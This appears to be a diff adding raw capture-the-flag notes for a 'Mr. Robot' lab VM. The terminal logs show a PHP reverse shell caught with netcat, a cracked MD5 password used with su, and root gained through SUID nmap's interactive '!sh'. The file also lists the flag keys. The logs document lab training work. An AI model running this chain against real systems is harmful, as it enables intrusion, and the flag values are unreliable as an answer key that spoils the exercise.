@@ -1,0 +1,324 @@
+Kernel Exploitation
+Improper Permission
+Information Disclosure
+
+GoatMilk Cheatsheet
+
+$id
+$whoami
+$uname -a
+$pwd
+$ls
+$cat /etc/passwd
+$cat /etc/shadow
+$cd /home
+$ls
+robot
+$ls -la
+$ls -la /etc/passwd
+$ls -la /etc/shadow
+Permission denied
+$cd /home
+$ls -la
+$cd robot
+$cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+$ su robot
+su: must be run from a terminal
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+daemon@linux:/home/robot$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~$ id
+id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+robot@linux:~$ whoami
+whoami
+robot
+robot@linux:~$ ls
+ls
+key-2-of-3.txt  password.raw-md5
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+robot@linux:~$ find / -perm -u=s 2>/dev/null
+find / -perm -u=s 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+robot@linux:~$ 
+
+
+
+
+POST-EXPLOITATION INFORMATION GATHERING
+
+crackstation.net
+I'm not a robot
+Crack Hashes
+
+Key_1: 
+
+Key_2: 822c73956184f694993bede3eb39f959
+
+Key_3: 04787ddef27c3dee1ee161b21670b4e4
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ cd Desktop                                   
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cd Mr.\ Robot 
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop/Mr. Robot]
+└─$ ls
+fsocity.dic  wordlists.txt
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop/Mr. Robot]
+└─$ cp /usr/share/webshells/php/php-reverse-shell.php . 
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop/Mr. Robot]
+└─$ ls
+fsocity.dic  php-reverse-shell.php  wordlists.txt
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop/Mr. Robot]
+└─$ nc -nvlp 1234       
+listening on [any] 1234 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.7] 33257
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 09:38:59 up 18 min,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+$ whoami
+daemon
+$ uname -a
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+$ pwd
+/
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
+bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
+mysql:x:1001:1001::/home/mysql:
+varnish:x:999:999::/home/varnish:
+robot:x:1002:1002::/home/robot:
+$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+$ cd /home
+$ la
+/bin/sh: 10: la: not found
+$ ls
+robot
+$ ls robot
+key-2-of-3.txt
+password.raw-md5
+$ ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
+$ cd robot
+$ ls
+key-2-of-3.txt
+password.raw-md5
+$ ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+$ cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+$ su robot
+su: must be run from a terminal
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+daemon@linux:/home/robot$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~$ id
+id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+robot@linux:~$ whoami
+whoami
+robot
+robot@linux:~$ ls
+ls
+key-2-of-3.txt  password.raw-md5
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+robot@linux:~$ ls -la /root
+ls -la /root
+ls: cannot open directory /root: Permission denied
+robot@linux:~$ find / -perm -u=s 2>/dev/null
+find / -perm -u=s 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+robot@linux:~$ ls -la /bin/ping
+ls -la /bin/ping
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+robot@linux:~$ ls -la /usr/local/bin/nmap
+ls -la /usr/local/bin/nmap
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+robot@linux:~$ /usr/local/bin/nmap --version
+/usr/local/bin/nmap --version
+
+nmap version 3.81 ( http://www.insecure.org/nmap/ )
+robot@linux:~$ /usr/local/bin/nmap --interactive
+/usr/local/bin/nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+# ls
+ls
+key-2-of-3.txt  password.raw-md5
+# ls -la
+ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+# cd /root
+cd /root
+# ls -la
+ls -la
+total 32
+drwx------  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+-rw-------  1 root root 4058 Nov 14  2015 .bash_history
+-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
+drwx------  2 root root 4096 Nov 13  2015 .cache
+-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+-rw-r--r--  1 root root  140 Feb 20  2014 .profile
+-rw-------  1 root root 1024 Sep 16  2015 .rnd
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+# 
